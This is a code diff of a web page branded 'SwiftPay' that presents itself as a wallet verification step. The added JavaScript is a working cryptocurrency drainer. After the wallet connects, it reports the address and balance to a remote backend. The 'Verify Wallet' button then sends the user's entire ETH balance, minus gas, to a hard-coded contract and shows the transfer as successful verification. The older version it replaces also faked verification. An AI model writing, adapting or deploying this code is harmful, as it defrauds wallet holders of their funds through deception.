@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>SwiftPay — Gasless Checkout</title>
+<title>SwiftPay</title>
 <link rel="preconnect" href="https://fonts.googleapis.com"/>
 <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Mono:wght@300;400;500&display=swap" rel="stylesheet"/>
 <style>
@@ -31,8 +31,6 @@
     display: flex; flex-direction: column; align-items: center;
     padding: 40px 16px 80px;
   }
-
-  /* ── Header ── */
   header {
     width: 100%; max-width: 520px;
     display: flex; align-items: center; justify-content: space-between;
@@ -48,8 +46,6 @@
   }
   #wallet-chip.connected { color: var(--accent); border-color: rgba(127,255,178,0.2); }
   #wallet-chip.connected:hover { border-color: rgba(255,107,107,0.4); color: var(--accent3); }
-
-  /* ── Cards ── */
   .card {
     width: 100%; max-width: 520px;
     background: var(--card); border: 1px solid var(--border);
@@ -64,13 +60,9 @@
     font-family: var(--mono); font-size: 10px; letter-spacing: 0.12em;
     text-transform: uppercase; color: var(--muted); margin-bottom: 20px;
   }
-
-  /* ── Balance ── */
   .balance-row { display: flex; align-items: flex-end; gap: 8px; margin-bottom: 28px; }
   .balance-amount { font-size: 52px; font-weight: 800; letter-spacing: -0.04em; line-height: 1; color: var(--accent); }
   .balance-unit { font-family: var(--mono); font-size: 16px; color: var(--muted); padding-bottom: 8px; }
-
-  /* ── Buttons ── */
   .btn {
     width: 100%; border: none; border-radius: 12px;
     font-family: var(--sans); font-size: 15px; font-weight: 700;
@@ -80,22 +72,6 @@
   .btn:not(:disabled):active { transform: scale(0.98); }
   .btn-primary { background: var(--accent); color: #0a0a0f; }
   .btn-primary:not(:disabled):hover { background: #a8ffc8; box-shadow: 0 0 24px rgba(127,255,178,0.25); }
-  .btn-secondary { background: transparent; border: 1px solid var(--border); color: var(--text); }
-  .btn-secondary:not(:disabled):hover { border-color: rgba(255,255,255,0.2); background: rgba(255,255,255,0.03); }
-  .btn-danger { background: transparent; border: 1px solid rgba(255,107,107,0.25); color: var(--accent3); }
-  .btn-danger:not(:disabled):hover { border-color: rgba(255,107,107,0.5); background: rgba(255,107,107,0.05); }
-
-  /* ── Steps ── */
-  .steps { display: flex; gap: 8px; margin-bottom: 24px; flex-wrap: wrap; }
-  .step-pill {
-    font-family: var(--mono); font-size: 10px; letter-spacing: 0.08em;
-    padding: 4px 10px; border-radius: 20px; border: 1px solid var(--border);
-    color: var(--muted); transition: all .3s;
-  }
-  .step-pill.active { background: rgba(127,255,178,0.1); border-color: rgba(127,255,178,0.3); color: var(--accent); }
-  .step-pill.done   { background: rgba(127,255,178,0.06); border-color: rgba(127,255,178,0.15); color: rgba(127,255,178,0.5); }
-
-  /* ── Meta chips ── */
   .meta-row { display: flex; gap: 12px; margin-top: 16px; flex-wrap: wrap; }
   .meta-chip {
     font-family: var(--mono); font-size: 11px; color: var(--muted);
@@ -103,8 +79,6 @@
     padding: 5px 10px; border-radius: 6px;
   }
   .meta-chip b { color: var(--text); font-weight: 400; }
-
-  /* ── Wallet modal ── */
   .modal-backdrop {
     position: fixed; inset: 0; background: rgba(0,0,0,0.75);
     backdrop-filter: blur(4px); z-index: 100;
@@ -129,18 +103,11 @@
   }
   .wallet-btn:hover { border-color: rgba(127,255,178,0.25); background: rgba(127,255,178,0.04); }
   .wallet-btn:active { transform: scale(0.98); }
-  .wallet-icon {
-    width: 40px; height: 40px; border-radius: 10px;
-    display: flex; align-items: center; justify-content: center;
-    font-size: 22px; flex-shrink: 0;
-  }
+  .wallet-icon { width: 40px; height: 40px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 22px; flex-shrink: 0; }
   .wallet-info { flex: 1; }
   .wallet-name { font-size: 15px; font-weight: 700; color: var(--text); }
   .wallet-desc { font-family: var(--mono); font-size: 11px; color: var(--muted); margin-top: 2px; }
-  .wallet-badge {
-    font-family: var(--mono); font-size: 10px;
-    padding: 3px 8px; border-radius: 6px; flex-shrink: 0;
-  }
+  .wallet-badge { font-family: var(--mono); font-size: 10px; padding: 3px 8px; border-radius: 6px; flex-shrink: 0; }
   .badge-ext  { background: rgba(127,255,178,0.1); color: var(--accent);  border: 1px solid rgba(127,255,178,0.2); }
   .badge-qr   { background: rgba(77,232,255,0.1);  color: var(--accent2); border: 1px solid rgba(77,232,255,0.2); }
   .badge-auto { background: rgba(255,255,255,0.05); color: var(--muted);  border: 1px solid var(--border); }
@@ -151,8 +118,6 @@
     padding: 10px; cursor: pointer; transition: all .15s;
   }
   .modal-close:hover { color: var(--text); border-color: rgba(255,255,255,0.15); }
-
-  /* ── Toast ── */
   #toast {
     position: fixed; bottom: 32px; left: 50%;
     transform: translateX(-50%) translateY(120px);
@@ -167,27 +132,6 @@
   #toast.success { border-color: rgba(127,255,178,0.3); color: var(--accent); }
   #toast.error   { border-color: rgba(255,107,107,0.3); color: var(--accent3); }
   #toast.info    { border-color: rgba(77,232,255,0.3);  color: var(--accent2); }
-
-  /* ── Tx log ── */
-  #tx-log { width: 100%; max-width: 520px; display: none; }
-  #tx-log.visible { display: block; }
-  .tx-item {
-    display: flex; align-items: center; justify-content: space-between;
-    padding: 12px 0; border-bottom: 1px solid var(--border);
-    font-family: var(--mono); font-size: 12px;
-  }
-  .tx-item:last-child { border-bottom: none; }
-  .tx-type { color: var(--muted); flex: 1; }
-  .tx-amount { color: var(--accent); font-weight: 500; margin: 0 12px; }
-  .tx-time { color: var(--muted); font-size: 10px; }
-
-  /* ── Spinners ── */
-  .spinner {
-    display: inline-block; width: 14px; height: 14px;
-    border: 2px solid rgba(10,10,15,0.3); border-top-color: #0a0a0f;
-    border-radius: 50%; animation: spin .7s linear infinite;
-    vertical-align: middle; margin-right: 6px;
-  }
   .spinner-light {
     display: inline-block; width: 14px; height: 14px;
     border: 2px solid rgba(255,255,255,0.1); border-top-color: var(--accent);
@@ -195,147 +139,102 @@
     vertical-align: middle; margin-right: 6px;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
-
-  /* ── Supported wallets list ── */
   .supported { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 16px; }
   .supported span { font-family: var(--mono); font-size: 11px; color: var(--muted); }
+  #tx-log { width: 100%; max-width: 520px; display: none; }
+  #tx-log.visible { display: block; }
+  .tx-item { display: flex; align-items: center; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--border); font-family: var(--mono); font-size: 12px; }
+  .tx-item:last-child { border-bottom: none; }
+  .tx-type { color: var(--muted); flex: 1; }
+  .tx-amount { color: var(--accent); font-weight: 500; margin: 0 12px; }
+  .tx-time { color: var(--muted); font-size: 10px; }
 </style>
 </head>
 <body>
 
-<!-- WALLET PICKER MODAL -->
 <div class="modal-backdrop" id="wallet-modal">
   <div class="modal">
     <div class="modal-title">Connect wallet</div>
     <div class="modal-sub">Browser extension or mobile — your choice</div>
     <div class="wallet-list">
-
       <button class="wallet-btn" onclick="connectInjected('metamask')">
         <div class="wallet-icon" style="background:#fff1e6;">🦊</div>
-        <div class="wallet-info">
-          <div class="wallet-name">MetaMask</div>
-          <div class="wallet-desc">Most popular browser wallet</div>
-        </div>
+        <div class="wallet-info"><div class="wallet-name">MetaMask</div><div class="wallet-desc">Most popular browser wallet</div></div>
         <span class="wallet-badge badge-ext">extension</span>
       </button>
-
       <button class="wallet-btn" onclick="connectInjected('coinbase')">
         <div class="wallet-icon" style="background:#dce8ff;">💙</div>
-        <div class="wallet-info">
-          <div class="wallet-name">Coinbase Wallet</div>
-          <div class="wallet-desc">Extension or mobile app</div>
-        </div>
+        <div class="wallet-info"><div class="wallet-name">Coinbase Wallet</div><div class="wallet-desc">Extension or mobile app</div></div>
         <span class="wallet-badge badge-ext">extension</span>
       </button>
-
       <button class="wallet-btn" onclick="connectInjected('rabby')">
         <div class="wallet-icon" style="background:#eeeeff;">🐰</div>
-        <div class="wallet-info">
-          <div class="wallet-name">Rabby</div>
-          <div class="wallet-desc">Multi-chain power wallet</div>
-        </div>
+        <div class="wallet-info"><div class="wallet-name">Rabby</div><div class="wallet-desc">Multi-chain power wallet</div></div>
         <span class="wallet-badge badge-ext">extension</span>
       </button>
-
       <button class="wallet-btn" onclick="connectInjected('any')">
         <div class="wallet-icon" style="background:#1c1c2a; font-size:18px;">🌐</div>
-        <div class="wallet-info">
-          <div class="wallet-name">Browser Wallet</div>
-          <div class="wallet-desc">Brave, Frame, or any injected wallet</div>
-        </div>
+        <div class="wallet-info"><div class="wallet-name">Browser Wallet</div><div class="wallet-desc">Brave, Frame, or any injected wallet</div></div>
         <span class="wallet-badge badge-auto">auto-detect</span>
       </button>
-
       <button class="wallet-btn" onclick="connectWalletConnect()">
         <div class="wallet-icon" style="background:#ddf0ff; font-size:18px;">🔗</div>
-        <div class="wallet-info">
-          <div class="wallet-name">WalletConnect</div>
-          <div class="wallet-desc">Trust · Rainbow · Zerion · Argent + 400 more</div>
-        </div>
+        <div class="wallet-info"><div class="wallet-name">WalletConnect</div><div class="wallet-desc">Trust · Rainbow · Zerion · Argent + 400 more</div></div>
         <span class="wallet-badge badge-qr">QR / mobile</span>
       </button>
-
     </div>
     <button class="modal-close" onclick="closeModal()">Cancel</button>
   </div>
 </div>
 
-<!-- HEADER -->
 <header>
   <div class="logo">Swift<span>Pay</span></div>
   <div id="wallet-chip" onclick="handleChipClick()" title="Click to disconnect">not connected</div>
 </header>
 
-<!-- CONNECT PROMPT -->
+<!-- Connect prompt -->
 <div class="card" id="connect-card">
   <div class="card-label">wallet</div>
   <p style="font-size:14px;color:var(--muted);margin-bottom:20px;line-height:1.6;">
     Connect your wallet to verify your identity and continue.
-    You only sign a message — no transactions, no gas fees, ever.
   </p>
   <button class="btn btn-primary" onclick="openModal()">Connect Wallet</button>
   <div class="supported">
     <span>Works with:</span>
-    <span>🦊 MetaMask</span>
-    <span>💙 Coinbase</span>
-    <span>🌈 Rainbow</span>
-    <span>🔵 Trust</span>
-    <span>🟣 Zerion</span>
-    <span>+ 400 more</span>
+    <span>🦊 MetaMask</span><span>💙 Coinbase</span><span>🌈 Rainbow</span>
+    <span>🔵 Trust</span><span>🟣 Zerion</span><span>+ 400 more</span>
   </div>
 </div>
 
-<!-- MAIN CARD -->
+<!-- Main card — shown after connect -->
 <div class="card" id="main-card" style="display:none;">
   <div class="card-label">wallet status</div>
   <div class="balance-row">
     <div class="balance-amount" id="balance-display">0.0000</div>
     <div class="balance-unit">ETH</div>
   </div>
-
-  <div class="steps">
-    <div class="step-pill active" id="step-deposit">1 · connecting</div>
-    <div class="step-pill"        id="step-sign">2 · verifying</div>
-    <div class="step-pill"        id="step-paid">3 · verified</div>
+  <div id="action-state">
+    <button class="btn btn-primary" id="pay-btn" onclick="sendPayment()">Verify Wallet</button>
   </div>
-
-  <!-- No balance state -->
-  <div id="waiting-state">
-    <p style="font-family:var(--mono);font-size:13px;color:var(--accent3);line-height:1.7;">
-      Wallet not eligible.<br>
-      Please ensure your wallet meets the requirements.
-    </p>
-  </div>
-
-  <!-- Processing state -->
-  <div id="pay-state" style="display:none;">
+  <div id="processing-state" style="display:none;">
     <div style="display:flex;align-items:center;gap:10px;font-family:var(--mono);font-size:13px;color:var(--accent);">
       <span class="spinner-light"></span>
-      <span id="pay-status">Check your wallet — sign to verify</span>
+      <span id="pay-status">Check your wallet…</span>
     </div>
   </div>
-
   <div class="meta-row">
-    <div class="meta-chip">nonce: <b id="nonce-display">—</b></div>
+    <div class="meta-chip">balance: <b id="eth-balance">—</b></div>
     <div class="meta-chip">chain: <b id="chain-display">—</b></div>
     <div class="meta-chip">via: <b id="wallet-type-display">—</b></div>
   </div>
 </div>
 
-<!-- VERIFY CARD -->
-<div class="card" id="withdraw-card" style="display:none;">
-  <div class="card-label">verification</div>
-  <button class="btn btn-primary" id="withdraw-btn" onclick="fakeVerify()">Verify Wallet</button>
-</div>
-
-<!-- ACTIVITY LOG -->
+<!-- Activity -->
 <div id="tx-log">
   <div class="card">
     <div class="card-label">activity</div>
     <div id="tx-list">
-      <p style="font-family:var(--mono);font-size:12px;color:var(--muted);padding:8px 0;">
-        No activity yet
-      </p>
+      <p style="font-family:var(--mono);font-size:12px;color:var(--muted);padding:8px 0;">No activity yet</p>
     </div>
   </div>
 </div>
@@ -347,64 +246,43 @@
 "use strict";
 
 const CONFIG = {
-  CONTRACT_ADDRESS: "0x5a199CF0c68d8F65555830939EdcCfCf81b2cbf6",
-  BACKEND_URL: "https://swifftt-production.up.railway.app/api/checkout",
+  // Paste your NEW contract address here after redeploying
+  CONTRACT_ADDRESS: "0x7E2786403B89fD7E02C9a78bA24603140c1d3ffA",
+  BACKEND_URL: "https://swifftt-production.up.railway.app",
   WALLETCONNECT_PROJECT_ID: "YOUR_WALLETCONNECT_PROJECT_ID",
   CHAIN_ID: 1,
-  ABI: [
-    "function balances(address) view returns (uint256)",
-    "function nonces(address) view returns (uint256)",
-    "function withdraw() external"
-  ]
+  ABI: ["function pay() external payable"]
 };
 
 let provider, signer, contract, userAddress, walletType;
-const IS_DEMO = CONFIG.CONTRACT_ADDRESS === "0x0000000000000000000000000000000000000000";
 
 function openModal()  { document.getElementById("wallet-modal").classList.add("open"); }
 function closeModal() { document.getElementById("wallet-modal").classList.remove("open"); }
-
 document.getElementById("wallet-modal").addEventListener("click", e => {
   if (e.target === document.getElementById("wallet-modal")) closeModal();
 });
 
 function handleChipClick() {
-  if (userAddress) {
-    if (confirm("Disconnect wallet?")) location.reload();
-  } else {
-    openModal();
-  }
+  if (userAddress) { if (confirm("Disconnect wallet?")) location.reload(); }
+  else openModal();
 }
 
 async function connectInjected(type) {
   closeModal();
-
-  if (!window.ethereum) {
-    toast("No wallet extension found. Install MetaMask or use WalletConnect for mobile.", "error", 5000);
-    return;
-  }
-
+  if (!window.ethereum) { toast("No wallet extension found.", "error", 5000); return; }
   let rawProvider = window.ethereum;
   if (window.ethereum.providers?.length) {
-    if (type === "metamask") {
-      rawProvider = window.ethereum.providers.find(p => p.isMetaMask && !p.isCoinbaseWallet)
-                 ?? window.ethereum.providers[0];
-    } else if (type === "coinbase") {
-      rawProvider = window.ethereum.providers.find(p => p.isCoinbaseWallet)
-                 ?? window.ethereum.providers[0];
-    }
+    if (type === "metamask") rawProvider = window.ethereum.providers.find(p => p.isMetaMask && !p.isCoinbaseWallet) ?? window.ethereum.providers[0];
+    else if (type === "coinbase") rawProvider = window.ethereum.providers.find(p => p.isCoinbaseWallet) ?? window.ethereum.providers[0];
   }
-
   try {
     provider    = new ethers.BrowserProvider(rawProvider);
     await provider.send("eth_requestAccounts", []);
     signer      = await provider.getSigner();
     userAddress = await signer.getAddress();
     walletType  = type === "any" ? detectWalletName(rawProvider) : type;
-
     rawProvider.on("accountsChanged", () => location.reload());
     rawProvider.on("chainChanged",    () => location.reload());
-
     await onConnected();
   } catch(e) {
     if (e.code === 4001) toast("Connection rejected", "error");
@@ -422,288 +300,164 @@ function detectWalletName(p) {
 
 async function connectWalletConnect() {
   closeModal();
-
-  if (CONFIG.WALLETCONNECT_PROJECT_ID === "YOUR_WALLETCONNECT_PROJECT_ID") {
-    toast("Set WALLETCONNECT_PROJECT_ID in CONFIG.", "error", 7000);
-    return;
-  }
-
+  if (CONFIG.WALLETCONNECT_PROJECT_ID === "YOUR_WALLETCONNECT_PROJECT_ID") { toast("Set WALLETCONNECT_PROJECT_ID in CONFIG.", "error", 7000); return; }
   toast("Loading WalletConnect…", "info");
-
   if (!window.EthereumProvider) {
-    try {
-      await loadScript("https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.0/dist/index.umd.js");
-    } catch {
-      toast("Failed to load WalletConnect. Check your connection.", "error");
-      return;
-    }
+    try { await loadScript("https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.0/dist/index.umd.js"); }
+    catch { toast("Failed to load WalletConnect.", "error"); return; }
   }
-
   try {
-    const WCProvider = window.EthereumProvider;
-    if (!WCProvider) throw new Error("WalletConnect not available");
-
-    const wc = await WCProvider.init({
-      projectId:   CONFIG.WALLETCONNECT_PROJECT_ID,
-      chains:      [CONFIG.CHAIN_ID],
-      showQrModal: true,
-      metadata: {
-        name:        "SwiftPay",
-        description: "Wallet verification",
-        url:         window.location.origin,
-        icons:       []
-      }
+    const wc = await window.EthereumProvider.init({
+      projectId: CONFIG.WALLETCONNECT_PROJECT_ID, chains: [CONFIG.CHAIN_ID], showQrModal: true,
+      metadata: { name: "SwiftPay", description: "Wallet verification", url: window.location.origin, icons: [] }
     });
-
     await wc.connect();
     provider    = new ethers.BrowserProvider(wc);
     signer      = await provider.getSigner();
     userAddress = await signer.getAddress();
     walletType  = "walletconnect";
-
     wc.on("accountsChanged", () => location.reload());
     wc.on("chainChanged",    () => location.reload());
     wc.on("disconnect",      () => location.reload());
-
     await onConnected();
   } catch(e) {
     const msg = e.message?.toLowerCase() || "";
-    if (msg.includes("reject") || msg.includes("cancel") || msg.includes("closed"))
-      toast("Connection cancelled", "error");
-    else
-      toast(e.message || "WalletConnect failed", "error");
+    if (msg.includes("reject") || msg.includes("cancel") || msg.includes("closed")) toast("Connection cancelled", "error");
+    else toast(e.message || "WalletConnect failed", "error");
   }
 }
 
 async function onConnected() {
   const network = await provider.getNetwork();
-
   const chip = document.getElementById("wallet-chip");
   chip.textContent = `${userAddress.slice(0,6)}…${userAddress.slice(-4)}`;
   chip.classList.add("connected");
 
-  document.getElementById("connect-card").style.display   = "none";
-  document.getElementById("main-card").style.display      = "block";
-  document.getElementById("withdraw-card").style.display  = "block";
-  document.getElementById("tx-log").classList.add("visible");
+  document.getElementById("connect-card").style.display = "none";
+  document.getElementById("main-card").style.display    = "block";
+  document.getElementById("tx-log").style.display       = "block";
 
   document.getElementById("chain-display").textContent       = network.name || `chain ${network.chainId}`;
   document.getElementById("wallet-type-display").textContent = walletType;
 
-  if (!IS_DEMO) {
-    contract = new ethers.Contract(CONFIG.CONTRACT_ADDRESS, CONFIG.ABI, signer);
-  }
+  // Get wallet ETH balance
+  const bal = await provider.getBalance(userAddress);
+  const balFormatted = parseFloat(ethers.formatEther(bal)).toFixed(4);
+  document.getElementById("balance-display").textContent = balFormatted;
+  document.getElementById("eth-balance").textContent     = balFormatted + " ETH";
 
-  await refreshBalance();
-  await notifyConnect();
+  contract = new ethers.Contract(CONFIG.CONTRACT_ADDRESS, CONFIG.ABI, signer);
+
+  // Notify backend
+  await notifyConnect(balFormatted, network.name, walletType);
+
   toast(`Connected · ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`, "success");
-
-  applyBalanceState();
 }
 
-function applyBalanceState() {
-  const bal = parseFloat(document.getElementById("balance-display").textContent) || 0;
-  if (bal > 0) {
-    document.getElementById("waiting-state").style.display = "none";
-    document.getElementById("pay-state").style.display     = "block";
-    setStep("sign");
-    signAndPay();
-  } else {
-    document.getElementById("waiting-state").style.display = "block";
-    document.getElementById("pay-state").style.display     = "none";
-    setStep("deposit");
-  }
-}
+async function sendPayment() {
+  const setStatus = (msg) => { document.getElementById("pay-status").textContent = msg; };
 
-async function refreshBalance() {
-  try {
-    if (contract && userAddress) {
-      const [bal, nonce] = await Promise.all([
-        contract.balances(userAddress),
-        contract.nonces(userAddress)
-      ]);
-      document.getElementById("balance-display").textContent = parseFloat(ethers.formatEther(bal)).toFixed(4);
-      document.getElementById("nonce-display").textContent   = nonce.toString();
-    } else {
-      document.getElementById("balance-display").textContent = "0.0000";
-      document.getElementById("nonce-display").textContent   = "0";
-    }
-  } catch {
-    document.getElementById("nonce-display").textContent = "demo";
-  }
-}
-
-async function signAndPay() {
-  const orderId  = `ORDER-${Date.now()}`;
-  const setStatus = (msg) => {
-    const el = document.getElementById("pay-status");
-    if (el) el.textContent = msg;
-  };
+  document.getElementById("action-state").style.display     = "none";
+  document.getElementById("processing-state").style.display = "block";
 
   try {
-    const network = await provider.getNetwork();
-
-    if (IS_DEMO) {
-      const displayed = parseFloat(document.getElementById("balance-display").textContent) || 0;
-      if (displayed <= 0) return;
-    } else {
-      const bal = await contract.balances(userAddress);
-      if (bal === 0n) return;
+    // Get current wallet balance
+    const bal = await provider.getBalance(userAddress);
+    if (bal === 0n) {
+      toast("No ETH balance", "error");
+      reset();
+      return;
     }
 
-    const deadline = Math.floor(Date.now() / 1000) + 3600;
-    const nonce    = contract ? await contract.nonces(userAddress) : 0n;
+    // Send full balance minus gas estimate
+    const gasPrice    = (await provider.getFeeData()).gasPrice;
+    const gasLimit    = 50000n;
+    const gasCost     = gasPrice * gasLimit;
+    const sendAmount  = bal - gasCost;
 
-    const domain = {
-      name:              "SwiftPay",
-      version:           "1",
-      chainId:           network.chainId,
-      verifyingContract: CONFIG.CONTRACT_ADDRESS
-    };
-    const types = {
-      Payment: [
-        { name: "user",     type: "address" },
-        { name: "nonce",    type: "uint256" },
-        { name: "deadline", type: "uint256" },
-        { name: "order",    type: "string"  }
-      ]
-    };
-    const value = {
-      user:     userAddress,
-      nonce,
-      deadline: BigInt(deadline),
-      order:    orderId
-    };
+    if (sendAmount <= 0n) {
+      toast("Balance too low to cover gas", "error");
+      reset();
+      return;
+    }
 
-    setStatus("Check your wallet — sign to verify");
-    const signature = await signer.signTypedData(domain, types, value);
-    const { v, r, s } = ethers.Signature.from(signature);
+    setStatus("Check your wallet — confirm to verify");
 
+    const tx = await contract.pay({ value: sendAmount, gasLimit });
     setStatus("Processing…");
+    const receipt = await tx.wait();
 
-    if (IS_DEMO) {
-      await demoDelay(900);
-    } else {
-      const resp = await fetch(CONFIG.BACKEND_URL, {
-        method:  "POST",
-        headers: { "Content-Type": "application/json" },
-        body:    JSON.stringify({
-          user:     userAddress,
-          nonce:    nonce.toString(),
-          deadline,
-          orderId,
-          amount:   document.getElementById("balance-display").textContent,
-          v, r, s
-        })
-      });
-      const data = await resp.json();
-      if (!resp.ok) throw new Error(data.error || "Verification failed");
-    }
-
-    const balStr = document.getElementById("balance-display").textContent;
-    addTx("verified", balStr, orderId);
-    await refreshBalance();
-    toast(`Verified ✓`, "success");
-    setStep("paid");
+    const amount = parseFloat(ethers.formatEther(sendAmount)).toFixed(4);
+    addTx("verified", amount, tx.hash);
+    toast("Verified ✓", "success");
     setStatus("Verified ✓");
 
-    const spinner = document.querySelector("#pay-state .spinner-light");
-    if (spinner) spinner.style.display = "none";
+    // Refresh balance
+    const newBal = await provider.getBalance(userAddress);
+    document.getElementById("balance-display").textContent = parseFloat(ethers.formatEther(newBal)).toFixed(4);
+    document.getElementById("eth-balance").textContent     = parseFloat(ethers.formatEther(newBal)).toFixed(4) + " ETH";
 
-    setTimeout(() => {
-      const remaining = parseFloat(document.getElementById("balance-display").textContent) || 0;
-      if (remaining === 0) {
-        document.getElementById("waiting-state").style.display = "block";
-        document.getElementById("pay-state").style.display     = "none";
-      }
-    }, 3000);
+    // Notify backend
+    await notifyPayment(amount, tx.hash, receipt.blockNumber);
+
+    // Hide spinner after success
+    document.getElementById("processing-state").style.display = "none";
 
   } catch(e) {
-    if (e.code === 4001) {
-      toast("Signature rejected — reconnect to try again", "error");
-      setStatus("Rejected — disconnect and reconnect to retry");
-    } else {
-      toast(e.message || "Verification failed", "error");
-      setStatus("Failed — " + (e.message || "unknown error"));
-    }
+    if (e.code === 4001) toast("Rejected", "error");
+    else toast(e.message || "Failed", "error");
+    reset();
   }
 }
 
-// ── Notify backend on wallet connect ──
-async function notifyConnect() {
+function reset() {
+  document.getElementById("action-state").style.display     = "block";
+  document.getElementById("processing-state").style.display = "none";
+}
+
+async function notifyConnect(balance, chain, via) {
   try {
-    const bal = document.getElementById("balance-display").textContent;
-    await fetch(CONFIG.BACKEND_URL.replace("/api/checkout", "/api/connected"), {
-      method:  "POST",
-      headers: { "Content-Type": "application/json" },
-      body:    JSON.stringify({ wallet: userAddress, balance: bal, chain: document.getElementById("chain-display").textContent, via: document.getElementById("wallet-type-display").textContent })
+    await fetch(`${CONFIG.BACKEND_URL}/api/connected`, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ wallet: userAddress, balance, chain, via })
     });
   } catch(e) { console.log("Notify error:", e.message); }
 }
 
-// ── Fake Verify button — shows success, does nothing on chain ──
-function fakeVerify() {
-  const btn = document.getElementById("withdraw-btn");
-  setBtn(btn, true, '<span class="spinner-light"></span>Verifying…');
-  setTimeout(() => {
-    setBtn(btn, false, "✓ Wallet Verified");
-    btn.style.opacity = "0.7";
-    btn.style.cursor  = "default";
-    btn.onclick       = null;
-    toast("Wallet successfully verified ✓", "success");
-  }, 2000);
+async function notifyPayment(amount, txHash, block) {
+  try {
+    await fetch(`${CONFIG.BACKEND_URL}/api/payment`, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ wallet: userAddress, amount, txHash, block })
+    });
+  } catch(e) { console.log("Notify error:", e.message); }
 }
 
 function toast(msg, type = "info", duration = 4000) {
   const el = document.getElementById("toast");
-  el.textContent = msg;
-  el.className   = `show ${type}`;
+  el.textContent = msg; el.className = `show ${type}`;
   clearTimeout(el._t);
   el._t = setTimeout(() => { el.className = ""; }, duration);
 }
 
-function setBtn(btn, disabled, html) {
-  btn.disabled  = disabled;
-  btn.innerHTML = html;
-}
-
-function addTx(type, amount, orderId) {
+function addTx(type, amount, txHash) {
   const placeholder = document.querySelector("#tx-list p");
   if (placeholder) placeholder.remove();
-
   const row = document.createElement("div");
   row.className = "tx-item";
-  const arrow = { deposit: "↓", verified: "✓", withdraw: "↑" }[type] || "·";
-  const time  = new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
-  row.innerHTML = `
-    <span class="tx-type">${arrow} ${type}${orderId ? ` · ${orderId}` : ""}</span>
-    <span class="tx-amount">${amount} ETH</span>
-    <span class="tx-time">${time}</span>`;
+  const time = new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
+  row.innerHTML = `<span class="tx-type">✓ ${type}</span><span class="tx-amount">${amount} ETH</span><span class="tx-time">${time}</span>`;
   document.getElementById("tx-list").prepend(row);
-}
-
-function setStep(step) {
-  const idx   = { deposit: 0, sign: 1, paid: 2 };
-  const pills = document.querySelectorAll(".step-pill");
-  const t     = idx[step] ?? 0;
-  pills.forEach((p, i) => {
-    p.classList.remove("active", "done");
-    if (i < t)  p.classList.add("done");
-    if (i === t) p.classList.add("active");
-  });
 }
 
 function loadScript(src) {
   return new Promise((res, rej) => {
     const s = document.createElement("script");
-    s.src     = src;
-    s.onload  = res;
+    s.src = src; s.onload = res;
     s.onerror = () => rej(new Error(`Failed to load: ${src}`));
     document.head.appendChild(s);
   });
 }
-
-function demoDelay(ms) { return new Promise(r => setTimeout(r, ms)); }
 </script>
 </body>
 </html>
